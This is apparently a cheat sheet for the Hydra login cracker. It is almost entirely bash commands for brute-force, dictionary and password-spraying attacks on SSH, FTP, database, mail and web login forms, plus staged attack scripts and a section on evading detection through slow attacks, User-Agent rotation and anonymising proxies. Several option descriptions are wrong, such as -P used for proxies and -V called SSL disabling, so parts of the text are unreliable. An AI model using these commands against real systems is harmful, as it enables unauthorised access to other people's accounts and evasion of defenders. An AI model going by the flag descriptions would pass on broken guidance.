# Hydra - Password Cracking Tool

## Overview
Hydra is a parallelized login cracker supporting numerous protocols for:
- Brute-force attacks
- Dictionary attacks
- Service authentication testing
- Network credential auditing
- Password spraying

## Basic Usage

### Simple Attack
```bash
# Attack SSH with single username and password
hydra -l admin -p password ssh://target.com

# Attack with username and password lists
hydra -L users.txt -P passwords.txt ssh://target.com

# Attack FTP service
hydra -L users.txt -P passwords.txt ftp://target.com
```

### Service Specification
```bash
# SSH service
hydra -L users.txt -P passwords.txt ssh://target.com

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt http-get://target.com/

# HTTP POST form
hydra -L users.txt -P passwords.txt http-post-form://target.com/login:username=^USER^&password=^PASS^:Invalid

# Telnet service
hydra -L users.txt -P passwords.txt telnet://target.com
```

## Protocol Support

### Common Protocols
```bash
# SSH (port 22)
hydra -L users.txt -P passwords.txt ssh://target.com:22

# FTP (port 21)
hydra -L users.txt -P passwords.txt ftp://target.com:21

# Telnet (port 23)
hydra -L users.txt -P passwords.txt telnet://target.com:23

# HTTP (port 80)
hydra -L users.txt -P passwords.txt http-get://target.com:80/

# HTTPS (port 443)
hydra -L users.txt -P passwords.txt http-get://target.com:443/
```

### Database Protocols
```bash
# MySQL
hydra -L users.txt -P passwords.txt mysql://target.com:3306

# PostgreSQL
hydra -L users.txt -P passwords.txt postgresql://target.com:5432

# Redis
hydra -L users.txt -P passwords.txt redis://target.com:6379
```

### Mail Protocols
```bash
# POP3
hydra -L users.txt -P passwords.txt pop3://target.com:110

# IMAP
hydra -L users.txt -P passwords.txt imap://target.com:143

# SMTP
hydra -L users.txt -P passwords.txt smtp://target.com:25
```

## Attack Methods

### Username/Password Combinations
```bash
# Separate user and password lists
hydra -L users.txt -P passwords.txt ssh://target.com

# Single user with password list
hydra -l admin -P passwords.txt ssh://target.com

# Username list with single password
hydra -L users.txt -p password ssh://target.com

# Single user and password
hydra -l admin -p password ssh://target.com
```

### Password Spraying
```bash
# Try one password against all users
hydra -L users.txt -p password123 ssh://target.com

# Try common passwords against all users
for pass in password123 admin123 123456; do
    hydra -L users.txt -p $pass ssh://target.com
done
```

### Pair Attack (user:pass format)
```bash
# Use credentials in user:pass format
cat > credentials.txt << EOF
admin:password
user:123456
test:test123
EOF

hydra -C credentials.txt ssh://target.com
```

## HTTP/Web Attacks

### Basic Authentication
```bash
# HTTP Basic Auth
hydra -L users.txt -P passwords.txt http-get://target.com/protected/

# HTTP POST Basic Auth
hydra -L users.txt -P passwords.txt http-post://target.com/protected/
```

### Form-based Authentication
```bash
# Simple form login
hydra -L users.txt -P passwords.txt http-post-form://target.com/login:username=^USER^&password=^PASS^:Invalid

# Form with custom success/failure strings
hydra -L users.txt -P passwords.txt http-post-form://target.com/login:username=^USER^&password=^PASS^:Welcome:Invalid

# Complex form with additional parameters
hydra -L users.txt -P passwords.txt http-post-form://target.com/login:username=^USER^&password=^PASS^&submit=Login:S=Welcome:F=Invalid
```

### Advanced HTTP Options
```bash
# Custom headers
hydra -L users.txt -P passwords.txt http-get://target.com/ -H "User-Agent: CustomBot/1.0"

# Custom User-Agent
hydra -L users.txt -P passwords.txt http-get://target.com/ -u "CustomBot/1.0"

# HTTPS with SSL verification disabled
hydra -L users.txt -P passwords.txt https://target.com/ -V

# Set custom path
hydra -L users.txt -P passwords.txt http-get://target.com/admin/
```

## Performance and Threading

### Concurrency Control
```bash
# Set number of parallel tasks
hydra -L users.txt -P passwords.txt -t 4 ssh://target.com

# Set delay between attempts
hydra -L users.txt -P passwords.txt -w 3 ssh://target.com

# Wait time for connection
hydra -L users.txt -P passwords.txt -W 5 ssh://target.com
```

### Time Control
```bash
# Set timeout
hydra -L users.txt -P passwords.txt -T 30 ssh://target.com

# Exit after first successful login
hydra -L users.txt -P passwords.txt -f ssh://target.com

# Continue after successful login
hydra -L users.txt -P passwords.txt -F ssh://target.com
```

## Output and Logging

### Output Options
```bash
# Verbose output
hydra -L users.txt -P passwords.txt -v ssh://target.com

# Debug output
hydra -L users.txt -P passwords.txt -vv ssh://target.com

# Quiet mode
hydra -L users.txt -P passwords.txt -q ssh://target.com

# Show only successful attempts
hydra -L users.txt -P passwords.txt -o results.txt ssh://target.com
```

### Saving Results
```bash
# Save to file
hydra -L users.txt -P passwords.txt -o hydra_results.txt ssh://target.com

# Save in specific format
hydra -L users.txt -P passwords.txt -o results.txt -b json ssh://target.com

# Append to existing file
hydra -L users.txt -P passwords.txt -o results.txt -b ssh://target.com
```

## Proxy Support

### HTTP Proxy
```bash
# Use HTTP proxy
hydra -L users.txt -P passwords.txt -P http://127.0.0.1:8080 ssh://target.com

# Use SOCKS proxy
hydra -L users.txt -P passwords.txt -P socks5://127.0.0.1:1080 ssh://target.com

# Proxy with authentication
hydra -L users.txt -P passwords.txt -P http://user:pass@proxy.com:8080 ssh://target.com
```

## Advanced Features

### Custom Modules
```bash
# List available modules
hydra -U

# Use specific module
hydra -L users.txt -P passwords.txt -M ssh://target.com

# Create custom module (if needed)
# See hydra documentation for module development
```

### IPv6 Support
```bash
# Attack IPv6 target
hydra -L users.txt -P passwords.txt -6 ssh://[::1]:22

# Specify IPv6 address
hydra -L users.txt -P passwords.txt -6 ssh://2001:db8::1
```

## Practical Examples

### SSH Penetration Testing
```bash
# Quick SSH brute force
hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt ssh://target.com

# Targeted SSH attack
hydra -l admin -P /usr/share/wordlists/passwords.txt ssh://target.com

# Slow SSH attack to avoid detection
hydra -L users.txt -P passwords.txt -t 1 -w 5 ssh://target.com
```

### Web Application Testing
```bash
# HTTP Basic Auth attack
hydra -L users.txt -P passwords.txt http-get://target.com/protected/

# Form-based login attack
hydra -L users.txt -P passwords.txt http-post-form://target.com/login:username=^USER^&password=^PASS^:Invalid

# WordPress admin attack
hydra -L users.txt -P passwords.txt http-post-form://target.com/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Login:S=Dashboard:F=Invalid
```

### Network Service Testing
```bash
# FTP service testing
hydra -L users.txt -P passwords.txt ftp://target.com

# Database service testing
hydra -L users.txt -P passwords.txt mysql://target.com

# Mail server testing
hydra -L users.txt -P passwords.txt pop3://target.com
```

### Password Spraying
```bash
# Spray common passwords
for pass in "Password123" "admin123" "password" "123456"; do
    echo "Trying password: $pass"
    hydra -L users.txt -p $pass ssh://target.com -f
done
```

## Automation Scripts

### Multi-Protocol Testing
```bash
#!/bin/bash
# Test multiple protocols

target="target.com"
users="users.txt"
passwords="passwords.txt"
protocols=("ssh" "ftp" "telnet")

for protocol in "${protocols[@]}"; do
    echo "Testing $protocol..."
    hydra -L "$users" -P "$passwords" "$protocol://$target" -o "${protocol}_results.txt"
done
```

### Progressive Attack
```bash
#!/bin/bash
# Progressive password attack

target="target.com"
users="users.txt"

# Stage 1: Common passwords
hydra -L "$users" -P common_passwords.txt ssh://"$target" -o stage1.txt

# Stage 2: Full dictionary if no results
if [ ! -s stage1.txt ]; then
    hydra -L "$users" -P rockyou.txt ssh://"$target" -o stage2.txt
fi

# Stage 3: Brute force short passwords
if [ ! -s stage2.txt ]; then
    hydra -L "$users" -x 1:6:1a ssh://"$target" -o stage3.txt
fi
```

## Counter-Detection Techniques

### Slow and Stealthy
```bash
# Very slow attack
hydra -L users.txt -P passwords.txt -t 1 -w 10 ssh://target.com

# Random delays
hydra -L users.txt -P passwords.txt -t 1 -w 3 -R ssh://target.com
```

### User-Agent Rotation
```bash
# Rotate User-Agent for HTTP attacks
for ua in "Mozilla/5.0" "curl/7.68.0" "wget/1.20.3"; do
    hydra -L users.txt -P passwords.txt -u "$ua" http-get://target.com/protected/
done
```

## Tips
- Use appropriate timing to avoid account lockouts
- Test with small wordlists first
- Use password spraying to avoid detection
- Monitor logs for lockout policies
- Be aware of legal and ethical considerations
- Use proxy for anonymity when needed
- Consider service-specific rate limiting
- Save results for analysis and documentation
- Use targeted wordlists based on reconnaissance
- Test against non-production systems when possible